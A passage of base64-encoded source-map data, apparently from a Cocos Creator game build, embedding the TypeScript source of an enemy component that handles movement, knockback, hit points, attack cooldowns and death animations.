oQixDQUFDO0lBRUQsc0JBQU0sR0FBTixVQUFPLEVBQVM7UUFDWixJQUFJLHFCQUFTLENBQUMsU0FBUyxJQUFJLElBQUksQ0FBQyxLQUFLLEVBQUM7WUFDbEMsT0FBTztTQUNWO1FBQ0QsbUNBQW1DO1FBQ25DLElBQUksSUFBSSxDQUFDLFNBQVMsRUFBQztZQUNmLGFBQWE7WUFDYixJQUFJLENBQUMsSUFBSSxDQUFDLFNBQVMsRUFBRSxJQUFJLElBQUksQ0FBQyxVQUFVLEVBQUUsQ0FBQyxJQUFJLElBQUksQ0FBQyxlQUFlLEVBQUUsRUFBQztnQkFDbEUsSUFBSSxDQUFDLFVBQVUsRUFBRSxDQUFDO2FBQ3JCO1lBRUQsU0FBUztZQUNULElBQUksSUFBSSxDQUFDLGNBQWMsRUFBQztnQkFDcEIsSUFBSSxDQUFDLE1BQU0sQ0FBQyxNQUFNLENBQUMsb0JBQW9CLENBQUMsQ0FBQyxJQUFJLENBQUMsSUFBSSxDQUFDLFFBQVEsQ0FBQyxHQUFHLENBQUMsSUFBSSxDQUFDLElBQUksQ0FBQyxRQUFRLENBQUMsQ0FBQyxTQUFTLEVBQUUsQ0FBQyxDQUFDO2FBQ3BHO1NBQ0o7UUFDRCxTQUFTO1FBQ1QsSUFBSSxJQUFJLENBQUMsUUFBUSxFQUFDO1lBQ2QsSUFBSSxDQUFDLElBQUksRUFBRSxDQUFDO1NBQ2Y7SUFDTCxDQUFDO0lBNWhCRDtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsUUFBUSxDQUFDO3NDQUNDO0lBSE4sS0FBSztRQUR6QixPQUFPO09BQ2EsS0FBSyxDQWdpQnpCO0lBQUQsWUFBQztDQWhpQkQsQUFnaUJDLENBaGlCa0MsRUFBRSxDQUFDLFNBQVMsR0FnaUI5QztrQkFoaUJvQixLQUFLIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcblxyXG5pbXBvcnQgRW5lbXlBQUJCIGZyb20gXCIuL0VuZW15QUFCQlwiO1xyXG5pbXBvcnQge0V4Y2VsVGFibGVOYW1lc30gZnJvbSBcIi4uLy4uL2NvbmZpZy9FeGNlbFRhYmxlTmFtZXNcIjtcclxuaW1wb3J0IHtFeGNlbENvbmZpZ30gZnJvbSBcIi4uLy4uLy4uLy4uL2ZyYW1ld29yay9jb25maWcvRXhjZWxDb25maWdcIjtcclxuaW1wb3J0IHtHYW1lUHJveHl9IGZyb20gXCIuLi8uLi9nYW1lL0dhbWVQcm94eVwiO1xyXG5pbXBvcnQge011c2ljfSBmcm9tIFwiLi4vLi4vLi4vLi4vZnJhbWV3b3JrL2F1ZGlvL011c2ljXCI7XHJcbmltcG9ydCB7ZXh0fSBmcm9tIFwiLi4vLi4vLi4vLi4vZnJhbWV3b3JrL2V4dGVuZC9FeHRlbmRcIjtcclxuXHJcbmNvbnN0IHtjY2NsYXNzLCBwcm9wZXJ0eX0gPSBjYy5fZGVjb3JhdG9yO1xyXG5cclxuY29uc3QgQXR0YWNrRGVsYXlMaXN0ID0gWzAuNCwgMC40LCAwLCAwLjIsIDAuMywgMC4zLCAwLjMsIDAuNV07XHJcblxyXG5jb25zdCBCQVNFX1RJTUVfU0NBTEUgPSAxLjU7XHJcblxyXG5AY2NjbGFzc1xyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBFbmVteSBleHRlbmRzIGNjLkNvbXBvbmVudCB7XHJcblxyXG4gICAgQHByb3BlcnR5KHNwLlNrZWxldG9uKVxyXG4gICAgc2tlOnNwLlNrZWxldG9uID0gbnVsbDtcclxuXHJcbiAgICBhdHRhY2tDRCA9IDE7XHJcblxyXG4gICAgcHJpdmF0ZSBfZ2FtZVNsb3cgPSBmYWxzZTtcclxuXHJcblxyXG4gICAgc2V0IGdhbWVTbG93KHZhbHVlOiBib29sZWFuKSB7XHJcbiAgICAgICAgdGhpcy5fZ2FtZVNsb3cgPSB2YWx1ZTtcclxuICAgICAgICBsZXQgdGltZVNjYWxlID0gQkFTRV9USU1FX1NDQUxFO1xyXG4gICAgICAgIGlmICh0aGlzLl9nYW1lU2xvdyl7XHJcbiAgICAgICAgICAgIHRpbWVTY2FsZSAqPSAwLjI7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIHRoaXMuc2tlLnRpbWVTY2FsZSA9IHRpbWVTY2FsZTtcclxuICAgIH1cclxuXHJcbiAgICBwcm90ZWN0ZWQgX21vdmVTcGVlZCA9IDA7XHJcblxyXG4gICAgLyoqIOmAn+W6pueahOWKoOaIkCAqL1xyXG4gICAgcHJvdGVjdGVkIF9zcGVlZEFkZCA9IDE7XHJcblxyXG4gICAgZ2V0IHNwZWVkQWRkKCk6IG51bWJlciB7XHJcbiAgICAgICAgcmV0dXJuIHRoaXMuX3NwZWVkQWRkO1xyXG4gICAgfVxyXG5cclxuICAgIHNldCBzcGVlZEFkZCh2YWx1ZTogbnVtYmVyKSB7XHJcbiAgICAgICAgdGhpcy5fc3BlZWRBZGQgPSB2YWx1ZTtcclxuICAgICAgICB0aGlzLnNrZS50aW1lU2NhbGUgPSBCQVNFX1RJTUVfU0NBTEUqdmFsdWU7XHJcbiAgICB9XHJcblxyXG4gICAgcHJvdGVjdGVkIF9iQWNjID0gZmFsc2U7XHJcblxyXG5cclxuICAgIHNldCBiQWNjKHZhbHVlOiBib29sZWFuKSB7XHJcbiAgICAgICAgdGhpcy5fYkFjYyA9IHZhbHVlO1xyXG4gICAgICAgIGlmICh0aGlzLl9iQWNjICYmIHRoaXMuZW5lbXlJRCA+IDMpe1xyXG4gICAgICAgICAgICBNdXNpYy5wbGF5U0ZYKFwic291bmQvbXNjX2VuMDAzXCIsIDAuNik7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIGFjY1NwZWVkID0gMDtcclxuXHJcbiAgICBmb3VuZFJhbmdlID0gMDtcclxuXHJcbiAgICBhdHRhY2tEaXN0YW5jZSA9IDEwMDtcclxuXHJcbiAgICBidWxsZXRTcGVlZCA9IDA7XHJcblxyXG4gICAgdW5yZXBlbCA9IDA7XHJcblxyXG4gICAgbWF4SHAgPSAwO1xyXG5cclxuICAgIC8qKiDmrbvlkI7niIbmsYHnvKnmlL4gKi9cclxuICAgIGh1bW9yU2NhbGUgPSAxO1xyXG5cclxuICAgIC8qKiDph5HluIHmlbAgKi9cclxuICAgIGdvbGQgPSAwO1xyXG5cclxuICAgIC8qKiDph5HluIHlm77moIfmjonokL0gKi9cclxuICAgIGdvbGRJY29uRmVsbCA9IDE7XHJcblxyXG4gICAgc3BlZWRjdXQgPSAwO1xyXG5cclxuICAgIC8qKiDnp7vliqjmoIflv5cgKi9cclxuICAgIG1vdmVGbGFnID0gZmFsc2U7XHJcblxyXG4gICAgLyoqIOi9rOWQkeinkuiJsuagh+W/lyAqL1xyXG4gICAgbG9va0F0Um9sZUZsYWcgPSBmYWxzZTtcclxuXHJcbiAgICAvKiog5pS75Ye75Ya35Y205LitICovXHJcbiAgICBhdHRhY2tDb29saW5nRmxhZyA9IGZhbHNlO1xyXG5cclxuICAgIC8qKiDpgLvovpHlpITnkIbmoIflv5cgKi9cclxuICAgIGxvZ2ljRmxhZyA9IGZhbHNlO1xyXG5cclxuICAgIC8qKiDnp7vliqjmlrnlkJEgKi9cclxuICAgIG1vdmVEaXIgPSBjYy52MigpO1xyXG5cclxuXHJcbiAgICBnZXQgbW92ZVNwZWVkKCk6IG51bWJlciB7XHJcbiAgICAgICAgcmV0dXJuIHRoaXMuX21vdmVTcGVlZCoodGhpcy5fYkFjYz90aGlzLmFjY1NwZWVkOjEpICogdGhpcy5fc3BlZWRBZGQgKiAodGhpcy5fZ2FtZVNsb3c/MC4yOjEpO1xyXG4gICAgfVxyXG5cclxuICAgIC8qKiDlg7XnoawgKi9cclxuICAgIHByaXZhdGUgX3N0aWZmID0gZmFsc2U7XHJcblxyXG5cclxuICAgIGdldCBzdGlmZigpOiBib29sZWFuIHtcclxuICAgICAgICByZXR1cm4gdGhpcy5fc3RpZmY7XHJcbiAgICB9XHJcblxyXG4gICAgc2V0IHN0aWZmKHZhbHVlOiBib29sZWFuKSB7XHJcbiAgICAgICAgdGhpcy5fc3RpZmYgPSB2YWx1ZTtcclxuICAgICAgICB0aGlzLnBsYXlTdGFuZCgpO1xyXG4gICAgfVxyXG5cclxuICAgIGRvU3RpZmYoc3RpZmY6bnVtYmVyKXtcclxuICAgICAgICB0aGlzLnN0aWZmID0gdHJ1ZTtcclxuICAgICAgICBsZXQgYWN0aW9uID0gY2Muc2VxdWVuY2UoY2MuZGVsYXlUaW1lKHN0aWZmKSwgY2MuY2FsbEZ1bmMoKCk9PnRoaXMuc3RpZmYgPSBmYWxzZSkpO1xyXG4gICAgICAgIGFjdGlvbi5zZXRUYWcoMTIzMCk7XHJcbiAgICAgICAgdGhpcy5ub2RlLnN0b3BBY3Rpb25CeVRhZygxMjMwKTtcclxuICAgICAgICB0aGlzLm5vZGUucnVuQWN0aW9uKGFjdGlvbik7XHJcbiAgICB9XHJcblxyXG4gICAgZG9TcGVlZGN1dCgpe1xyXG4gICAgICAgIGlmICh0aGlzLnNwZWVkY3V0ID4gMCl7XHJcbiAgICAgICAgICAgIHRoaXMuc3BlZWRBZGQgPSAxIC0gdGhpcy5zcGVlZGN1dDtcclxuICAgICAgICAgICAgbGV0IGFjdGlvbiA9IGNjLnNlcXVlbmNlKGNjLmRlbGF5VGltZSgwLjE1KSwgY2MuY2FsbEZ1bmMoKCk9PnRoaXMuc3BlZWRBZGQgPSAxKSk7XHJcbiAgICAgICAgICAgIGFjdGlvbi5zZXRUYWcoMjUxMCk7XHJcbiAgICAgICAgICAgIHRoaXMubm9kZS5zdG9wQWN0aW9uQnlUYWcoMjUxMCk7XHJcbiAgICAgICAgICAgIHRoaXMubm9kZS5ydW5BY3Rpb24oYWN0aW9uKTtcclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgZG9SZXBlbChkaXI6Y2MuVmVjMiwgcmVwZWw6bnVtYmVyKXtcclxuICAgICAgICB0aGlzLnBsYXlCZWF0ZW4oKTtcclxuICAgICAgICAvKiog6K6h566X5LiO6L6557q/57q/5q6155qE5Lqk54K5ICovXHJcbiAgICAgICAgbGV0IGRlbHRhID0gZGlyLm11bChyZXBlbCk7XHJcbiAgICAgICAgbGV0IGRlc3RQb3MgPSB0aGlzLm5vZGUucG9zaXRpb24uYWRkKGRlbHRhKTtcclxuICAgICAgICBsZXQgaW50ZXJzZWN0aW9ucyA9IFtdO1xyXG4gICAgICAgIGlmIChkaXIueCA+IDApe1xyXG4gICAgICAgICAgICAvL+WPs+i+ueeVjFxyXG4gICAgICAgICAgICBpZiAoZGVzdFBvcy54ID49IHRoaXMuX2JvdW5kcy54TWF4KXtcclxuICAgICAgICAgICAgICAgIGxldCBwb2ludCA9IGNjLnYyKCk7XHJcbiAgICAgICAgICAgICAgICBpZihjYy5JbnRlcnNlY3Rpb24ucExpbmVJbnRlcnNlY3QodGhpcy5ub2RlLnBvc2l0aW9uLCBkZXN0UG9zLCBjYy52Mih0aGlzLl9ib3VuZHMueE1heCwgdGhpcy5fYm91bmRzLnlNaW4pLCBjYy52Mih0aGlzLl9ib3VuZHMueE1heCwgdGhpcy5fYm91bmRzLnlNYXgpLCBwb2ludCkpe1xyXG4gICAgICAgICAgICAgICAgICAgIGludGVyc2VjdGlvbnMucHVzaChwb2ludCk7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9ZWxzZSBpZiAoZGlyLnggPCAwKSB7XHJcbiAgICAgICAgICAgIC8v5bem6L6555WMXHJcbiAgICAgICAgICAgIGlmIChkZXN0UG9zLnggPD0gdGhpcy5fYm91bmRzLnhNaW4pe1xyXG4gICAgICAgICAgICAgICAgbGV0IHBvaW50ID0gY2MudjIoKTtcclxuICAgICAgICAgICAgICAgIGlmKGNjLkludGVyc2VjdGlvbi5wTGluZUludGVyc2VjdCh0aGlzLm5vZGUucG9zaXRpb24sIGRlc3RQb3MsIGNjLnYyKHRoaXMuX2JvdW5kcy54TWluLCB0aGlzLl9ib3VuZHMueU1pbiksIGNjLnYyKHRoaXMuX2JvdW5kcy54TWluLCB0aGlzLl9ib3VuZHMueU1heCksIHBvaW50KSl7XHJcbiAgICAgICAgICAgICAgICAgICAgaW50ZXJzZWN0aW9ucy5wdXNoKHBvaW50KTtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgaWYgKGRpci55ID4gMCl7XHJcbiAgICAgICAgICAgIC8v5LiK6L6555WMXHJcbiAgICAgICAgICAgIGlmIChkZXN0UG9zLnkgPj0gdGhpcy5fYm91bmRzLnlNYXgpe1xyXG4gICAgICAgICAgICAgICAgbGV0IHBvaW50ID0gY2MudjIoKTtcclxuICAgICAgICAgICAgICAgIGlmKGNjLkludGVyc2VjdGlvbi5wTGluZUludGVyc2VjdCh0aGlzLm5vZGUucG9zaXRpb24sIGRlc3RQb3MsIGNjLnYyKHRoaXMuX2JvdW5kcy54TWluLCB0aGlzLl9ib3VuZHMueU1heCksIGNjLnYyKHRoaXMuX2JvdW5kcy54TWF4LCB0aGlzLl9ib3VuZHMueU1heCksIHBvaW50KSl7XHJcbiAgICAgICAgICAgICAgICAgICAgaW50ZXJzZWN0aW9ucy5wdXNoKHBvaW50KTtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1lbHNlIGlmIChkaXIueSA8IDApe1xyXG4gICAgICAgICAgICAvL+S4iui+ueeVjFxyXG4gICAgICAgICAgICBpZiAoZGVzdFBvcy55IDw9IHRoaXMuX2JvdW5kcy55TWluKXtcclxuICAgICAgICAgICAgICAgIGxldCBwb2ludCA9IGNjLnYyKCk7XHJcbiAgICAgICAgICAgICAgICBpZihjYy5JbnRlcnNlY3Rpb24ucExpbmVJbnRlcnNlY3QodGhpcy5ub2RlLnBvc2l0aW9uLCBkZXN0UG9zLCBjYy52Mih0aGlzLl9ib3VuZHMueE1pbiwgdGhpcy5fYm91bmRzLnlNaW4pLCBjYy52Mih0aGlzLl9ib3VuZHMueE1heCwgdGhpcy5fYm91bmRzLnlNaW4pLCBwb2ludCkpe1xyXG4gICAgICAgICAgICAgICAgICAgIGludGVyc2VjdGlvbnMucHVzaChwb2ludCk7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIGlmIChpbnRlcnNlY3Rpb25zLmxlbmd0aCA+IDApe1xyXG4gICAgICAgICAgICAvLyBjb25zb2xlLmxvZyhcIumHjeaWsOiuoeeul2Rlc3RQb3M9PT0+aW50ZXJzZWN0aW9uc1wiLCBpbnRlcnNlY3Rpb25zKTtcclxuICAgICAgICAgICAgLyoqIOmHjeaWsOiuoeeul2Rlc3RQb3MgKi9cclxuICAgICAgICAgICAgaWYgKGludGVyc2VjdGlvbnMubGVuZ3RoID09IDEpe1xyXG4gICAgICAgICAgICAgICAgZGVzdFBvcyA9IGludGVyc2VjdGlvbnNbMF0uYWRkU2VsZihkaXIubmVnKGNjLnYyKCkpKTtcclxuICAgICAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgICAgICAgIC8qKiDlj5bot53nprvmgKrnianmnIDov5HnmoTpgqPkuKrngrkgKi9cclxuICAgICAgICAgICAgICAgIGxldCBwID0gaW50ZXJzZWN0aW9uc1swXTtcclxuICAgICAgICAgICAgICAgIGxldCBtaW5EaXN0YW5jZSA9IHAuc3ViKHRoaXMubm9kZS5wb3NpdGlvbikubWFnKCk7XHJcbiAgICAgICAgICAgICAgICBmb3IgKGxldCBpPTE7IGk8aW50ZXJzZWN0aW9ucy5sZW5ndGg7IGkrKyl7XHJcbiAgICAgICAgICAgICAgICAgICAgbGV0IG1hZyA9IGludGVyc2VjdGlvbnNbaV0uc3ViKHRoaXMubm9kZS5wb3NpdGlvbikubWFnKCk7XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKG1hZyA8IG1pbkRpc3RhbmNlKXtcclxuICAgICAgICAgICAgICAgICAgICAgICAgcCA9IGludGVyc2VjdGlvbnNbaV07XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIG1pbkRpc3RhbmNlID0gbWFnO1xyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIGRlc3RQb3MgPSBwLmFkZFNlbGYoZGlyLm5lZyhjYy52MigpKSk7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcbiAgICAgICAgbGV0IGRpc3RhbmNlID0gZGVzdFBvcy5zdWIodGhpcy5ub2RlLnBvc2l0aW9uKS5tYWcoKTtcclxuICAgICAgICBsZXQgc3BlZWQgPSA4MDA7XHJcbiAgICAgICAgbGV0IGFjdGlvbiA9IGNjLnNlcXVlbmNlKGNjLm1vdmVUbyhkaXN0YW5jZS9zcGVlZCwgZGVzdFBvcykuZWFzaW5nKGNjLmVhc2VDaXJjbGVBY3Rpb25PdXQoKSksIGNjLmNhbGxGdW5jKCgpPT57XHJcbiAgICAgICAgICAgIHRoaXMucGxheUJlYXRlbkJhY2soKTtcclxuICAgICAgICB9KSk7XHJcbiAgICAgICAgYWN0aW9uLnNldFRhZyg1ODIpO1xyXG4gICAgICAgIHRoaXMubm9kZS5zdG9wQWN0aW9uQnlUYWcoNTgyKTtcclxuICAgICAgICB0aGlzLm5vZGUucnVuQWN0aW9uKGFjdGlvbik7XHJcbiAgICB9XHJcblxyXG4gICAgcHJpdmF0ZSBfaHAgPSAwO1xyXG5cclxuICAgIGdldCBocCgpOiBudW1iZXIge1xyXG4gICAgICAgIHJldHVybiB0aGlzLl9ocDtcclxuICAgIH1cclxuXHJcbiAgICBzZXQgaHAodmFsdWU6IG51bWJlcikge1xyXG4gICAgICAgIGlmICh0aGlzLl9ocCA8PSAwKXJldHVybjtcclxuICAgICAgICBsZXQgZGFtYWdlID0gdGhpcy5faHAgLSB2YWx1ZTtcclxuICAgICAgICB3aW5kb3dbJ0dhbWVMYWJlbHNDb250cm9sbGVyJ10gLmZseShgLSR7ZXh0LnNob3J0Rm9ybWF0KGRhbWFnZSl9YCwgdGhpcy5ub2RlLnBvc2l0aW9uLmFkZChjYy52MigwLCB0aGlzLnNwYWNlQ2lyY2xlQ29sbGlkZXIucmFkaXVzKSkpO1xyXG4gICAgICAgIHRoaXMuc2tlLm5vZGUuY29sb3IgPSB0aGlzLnNrZS5ub2RlLmNvbG9yLmZyb21IRVgoXCIjRDg1OTU5XCIpO1xyXG4gICAgICAgIHRoaXMuc2tlLm5vZGUucnVuQWN0aW9uKGNjLnNlcXVlbmNlKGNjLmRlbGF5VGltZSgwLjA1KSwgY2MuY2FsbEZ1bmMoKCk9PnRoaXMuc2tlLm5vZGUuY29sb3IgPSBjYy5Db2xvci5XSElURSkpKTtcclxuICAgICAgICB0aGlzLl9ocCA9IHZhbHVlO1xyXG4gICAgICAgIGlmICh2YWx1ZSA8PSAwKXtcclxuICAgICAgICAgICAgR2FtZVByb3h5LmtpbGxDb3VudCsrO1xyXG4gICAgICAgICAgICBHYW1lUHJveHkuZW1pdChHYW1lUHJveHkuRXZlbnQuS2lsbEVuZW15LCB0aGlzKTtcclxuICAgICAgICAgICAgdGhpcy5ub2RlLnN0b3BBbGxBY3Rpb25zKCk7XHJcbiAgICAgICAgICAgIHRoaXMuX3N0aWZmID0gdHJ1ZTtcclxuICAgICAgICAgICAgdGhpcy5wbGF5RGVhZCgpO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICBodXJ0ID0gMDtcclxuXHJcbiAgICBoaWVyYXJjaHkgPSAwO1xyXG5cclxuICAgIC8qKiDnu7zlkIjlsZ7mgKcgKi9cclxuXHJcbiAgICAvKiog5pWP5o235bqmICovXHJcbiAgICBhZ2lsaXR5ID0gMDtcclxuXHJcbiAgICBwcml2YXRlIF9zdHJpa2VDb21wbGV0ZVRpbWUgPSAwO1xyXG5cclxuXHJcbiAgICBnZXQgc3RyaWtlQ29tcGxldGVUaW1lKCk6IG51bWJlciB7XHJcbiAgICAgICAgcmV0dXJuIHRoaXMuX3N0cmlrZUNvbXBsZXRlVGltZTtcclxuICAgIH1cclxuXHJcbiAgICBwcml2YXRlIF9zcGFjZUNpcmNsZUNvbGxpZGVyOmNjLkNpcmNsZUNvbGxpZGVyID0gbnVsbDtcclxuXHJcbiAgICBwcml2YXRlIF9kZWZlbmNlQm94Q29sbGlkZXI6Y2MuQm94Q29sbGlkZXIgPSBudWxsO1xyXG5cclxuXHJcbiAgICBnZXQgc3BhY2VDaXJjbGVDb2xsaWRlcigpOiBjYy5DaXJjbGVDb2xsaWRlciB7XHJcbiAgICAgICAgcmV0dXJuIHRoaXMuX3NwYWNlQ2lyY2xlQ29sbGlkZXI7XHJcbiAgICB9XHJcblxyXG4gICAgZ2V0IGRlZmVuY2VCb3hDb2xsaWRlcigpOiBjYy5Cb3hDb2xsaWRlciB7XHJcbiAgICAgICAgcmV0dXJuIHRoaXMuX2RlZmVuY2VCb3hDb2xsaWRlcjtcclxuICAgIH1cclxuXHJcbiAgICBwcml2YXRlIF9lbmVteUFBQkI6RW5lbXlBQUJCID0gbnVsbDtcclxuXHJcblxyXG4gICAgZ2V0IGVuZW15QUFCQigpOiBFbmVteUFBQkIge1xyXG4gICAgICAgIHJldHVybiB0aGlzLl9lbmVteUFBQkI7XHJcbiAgICB9XHJcblxyXG4gICAgcHJpdmF0ZSBfYm91bmRzID0gY2MucmVjdCgpO1xyXG5cclxuICAgIHJlc2V0KCl7XHJcbiAgICAgICAgdGhpcy5faHAgPSB0aGlzLm1heEhwO1xyXG4gICAgICAgIHRoaXMuc3RpZmYgPSBmYWxzZTtcclxuICAgICAgICB0aGlzLnNwZWVkQWRkID0gMTtcclxuICAgICAgICB0aGlzLmdhbWVTbG93ID0gR2FtZVByb3h5LnNsb3dHYW1lO1xyXG4gICAgICAgIHRoaXMuX2JBY2MgPSBmYWxzZTtcclxuICAgICAgICBpZiAoR2FtZVByb3h5Lm1heEVuZW15TnVtIC0gR2FtZVByb3h5LmVuZW15TGlzdC5sZW5ndGggID49IEdhbWVQcm94eS5sZXZlbENvbmZpZy5hbW91bnRfcDErMSl7XHJcbiAgICAgICAgICAgIHRoaXMuYkFjYyA9IHRydWU7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIHRoaXMuc2tlLnRpbWVTY2FsZSA9IEJBU0VfVElNRV9TQ0FMRTtcclxuICAgICAgICB0aGlzLm1vdmVGbGFnID0gZmFsc2U7XHJcbiAgICAgICAgdGhpcy5sb29rQXRSb2xlRmxhZyA9IGZhbHNlO1xyXG4gICAgICAgIHRoaXMuYXR0YWNrQ29vbGluZ0ZsYWcgPSBmYWxzZTtcclxuICAgICAgICB0aGlzLmxvZ2ljRmxhZyA9IGZhbHNlO1xyXG4gICAgICAgIHRoaXMubm9kZS5vbihjYy5Ob2RlLkV2ZW50VHlwZS5ST1RBVElPTl9DSEFOR0VELCAoKT0+e1xyXG4gICAgICAgICAgICB0aGlzLm1vdmVEaXIgPSBjYy52MigwLCAxKS5ub3JtYWxpemUoKS5yb3RhdGUoY2MubWlzYy5kZWdyZWVzVG9SYWRpYW5zKC10aGlzLm5vZGUucm90YXRpb24pKTtcclxuICAgICAgICB9KTtcclxuICAgICAgICAvKiog5pyd5ZCR6KeS6ImyICovXHJcbiAgICAgICAgbGV0IGRpciA9IHdpbmRvd1snR2FtZVJvbGVDb250cm9sbGVyJ10ucm9sZS5ub2RlLnBvc2l0aW9uLnN1Yih0aGlzLm5vZGUucG9zaXRpb24pO1xyXG4gICAgICAgIHRoaXMubm9kZS5yb3RhdGlvbiA9IDkwIC0gY2MubWlzYy5yYWRpYW5zVG9EZWdyZWVzKE1hdGguYXRhbjIoZGlyLnksIGRpci54KSk7XHJcbiAgICAgICAgdGhpcy5wbGF5U3RhbmQoKTtcclxuICAgIH1cclxuXHJcbiAgICBvbkVuYWJsZSgpe1xyXG4gICAgICAgIHRoaXMucmVzZXQoKTtcclxuICAgIH1cclxuXHJcbiAgICBvbkRpc2FibGUoKXtcclxuICAgICAgICB0aGlzLm5vZGUuc3RvcEFsbEFjdGlvbnMoKTtcclxuICAgIH1cclxuXHJcbiAgICBzdGFydCgpe1xyXG4gICAgICAgIGxldCBiZ05vZGUgPSB0aGlzLm5vZGUuZ2V0UGFyZW50KCkuZ2V0UGFyZW50KCk7XHJcbiAgICAgICAgdGhpcy5fYm91bmRzLnggPSAtYmdOb2RlLndpZHRoLzIgKyB0aGlzLnNwYWNlQ2lyY2xlQ29sbGlkZXIucmFkaXVzO1xyXG4gICAgICAgIHRoaXMuX2JvdW5kcy55ID0gLWJnTm9kZS5oZWlnaHQvMiArIHRoaXMuc3BhY2VDaXJjbGVDb2xsaWRlci5yYWRpdXM7XHJcbiAgICAgICAgdGhpcy5fYm91bmRzLndpZHRoID0gYmdOb2RlLndpZHRoIC0gdGhpcy5zcGFjZUNpcmNsZUNvbGxpZGVyLnJhZGl1cyoyO1xyXG4gICAgICAgIHRoaXMuX2JvdW5kcy5oZWlnaHQgPSBiZ05vZGUuaGVpZ2h0IC0gdGhpcy5zcGFjZUNpcmNsZUNvbGxpZGVyLnJhZGl1cyoyO1xyXG4gICAgfVxyXG5cclxuICAgIG9uTG9hZCgpe1xyXG4gICAgICAgIHRoaXMuX3NwYWNlQ2lyY2xlQ29sbGlkZXIgPSB0aGlzLmdldENvbXBvbmVudChjYy5DaXJjbGVDb2xsaWRlcik7XHJcbiAgICAgICAgdGhpcy5fZGVmZW5jZUJveENvbGxpZGVyID0gdGhpcy5nZXRDb21wb25lbnQoY2MuQm94Q29sbGlkZXIpO1xyXG4gICAgICAgIHRoaXMuX2VuZW15QUFCQiA9IHRoaXMuZ2V0Q29tcG9uZW50KEVuZW15QUFCQik7XHJcbiAgICAgICAgdGhpcy5za2Uuc2V0TWl4KFwic3RyaWtlXCIsIFwic3RhbmRcIiwgMC4xKTtcclxuICAgICAgICB0aGlzLnNrZS5zZXRNaXgoXCJ3YWxrXCIsIFwic3RyaWtlXCIsIDAuMSk7XHJcbiAgICAgICAgdGhpcy5za2Uuc2V0Q29tcGxldGVMaXN0ZW5lcigodHJhY2tFbnRyeSwgbG9vcENvdW50KSA9PiB7XHJcbiAgICAgICAgICAgIGxldCBuYW1lID0gdHJhY2tFbnRyeS5hbmltYXRpb24gPyB0cmFja0VudHJ5LmFuaW1hdGlvbi5uYW1lIDogJyc7XHJcbiAgICAgICAgICAgIGlmIChuYW1lID09IFwic3RyaWtlXCIpIHtcclxuICAgICAgICAgICAgICAgIHRoaXMucGxheVN0YW5kKCk7XHJcbiAgICAgICAgICAgICAgICB0aGlzLl9zdHJpa2VDb21wbGV0ZVRpbWUgPSBuZXcgRGF0ZSgpLmdldFRpbWUoKTtcclxuICAgICAgICAgICAgICAgIHRoaXMuYXR0YWNrQ29vbGluZ0ZsYWcgPSB0cnVlO1xyXG4gICAgICAgICAgICAgICAgdGhpcy5ub2RlLnJ1bkFjdGlvbihjYy5zZXF1ZW5jZShjYy5kZWxheVRpbWUodGhpcy5hdHRhY2tDRCksIGNjLmNhbGxGdW5jKCgpPT57XHJcbiAgICAgICAgICAgICAgICAgICAgdGhpcy5hdHRhY2tDb29saW5nRmxhZyA9IGZhbHNlO1xyXG4gICAgICAgICAgICAgICAgfSkpKTtcclxuICAgICAgICAgICAgfWVsc2UgaWYgKG5hbWUgPT0gXCJiZWF0ZW5cIil7XHJcbiAgICAgICAgICAgICAgICB0aGlzLnBsYXlTdGFuZCgpO1xyXG4gICAgICAgICAgICB9ZWxzZSBpZiAobmFtZSA9PSBcImRlYWRcIil7XHJcbiAgICAgICAgICAgICAgICB0aGlzLnNob3dCbG9vZCgpO1xyXG4gICAgICAgICAgICAgICAgdGhpcy5ub2RlLnJ1bkFjdGlvbihjYy5zZXF1ZW5jZShjYy5kZWxheVRpbWUoMCksIGNjLmNhbGxGdW5jKCgpPT57XHJcbiAgICAgICAgICAgICAgICAgICAgdGhpcy5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgICAgICAgICAgfSkpKTtcclxuICAgICAgICAgICAgfWVsc2UgaWYgKG5hbWUgPT0gXCJzdGFuZFwiKXtcclxuICAgICAgICAgICAgICAgIHRoaXMucGxheVdhbGsoKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH0pO1xyXG4gICAgfVxyXG5cclxuICAgIHByaXZhdGUgc2hvd0Jsb29kKCl7XHJcbiAgICAgICAgbGV0IGJsb29kTm9kZSA9IHdpbmRvd1snR2FtZUVuZW15c0NvbnRyb2xsZXInXS5nZXRJbmFjdGl2ZUVuZW15Qmxvb2ROb2RlKCk7XHJcbiAgICAgICAgYmxvb2ROb2RlLmFjdGl2ZSA9IHRydWU7XHJcbiAgICAgICAgYmxvb2ROb2RlLnBvc2l0aW9uID0gdGhpcy5ub2RlLnBvc2l0aW9uO1xyXG4gICAgICAgIGJsb29kTm9kZS5yb3RhdGlvbiA9IE1hdGgucmFuZG9tKCkqMzYwO1xyXG4gICAgICAgIGJsb29kTm9kZS5zY2FsZSA9IHRoaXMuaHVtb3JTY2FsZTtcclxuICAgICAgICBibG9vZE5vZGUub3BhY2l0eSA9IDI1NTtcclxuICAgICAgICBibG9vZE5vZGUucnVuQWN0aW9uKGNjLnNlcXVlbmNlKGNjLmRlbGF5VGltZSgxKSwgY2MuZmFkZVRvKDAuNSwgNjApLCBjYy5jY